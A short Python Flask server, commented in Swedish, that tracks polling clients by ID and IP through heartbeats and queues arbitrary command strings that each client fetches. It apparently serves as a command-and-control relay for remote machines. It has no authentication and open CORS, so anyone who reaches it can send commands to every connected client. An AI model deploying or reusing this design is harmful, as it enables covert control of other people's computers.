from flask import Flask, request, jsonify
from flask_cors import CORS
import time
import os

app = Flask(__name__)
CORS(app)

commands = {}
clients = {}

HEARTBEAT_TIMEOUT = 30  # Sekunder

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    client_id = request.form.get('client_id')
    ip = request.form.get('ip')
    if client_id:
        clients[client_id] = {
            "ip": ip,
            "last_seen": time.time()
        }
        return "OK"
    return "Missing client_id", 400

@app.route('/get-clients', methods=['GET'])
def get_clients():
    now = time.time()
    # Rensa bort clients som inte hörts av på HEARTBEAT_TIMEOUT sekunder
    active_clients = {cid: info for cid, info in clients.items() if now - info['last_seen'] < HEARTBEAT_TIMEOUT}
    return jsonify(active_clients)

@app.route('/send-command', methods=['POST'])
def send_command():
    cmd = request.form.get('cmd', '')
    client_id = request.form.get('client_id')
    if client_id:
        commands[client_id] = cmd
    return "OK"

@app.route('/get-command', methods=['GET'])
def get_command():
    client_id = request.args.get('client_id')
    if client_id and client_id in commands:
        return commands[client_id]
    return ''

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
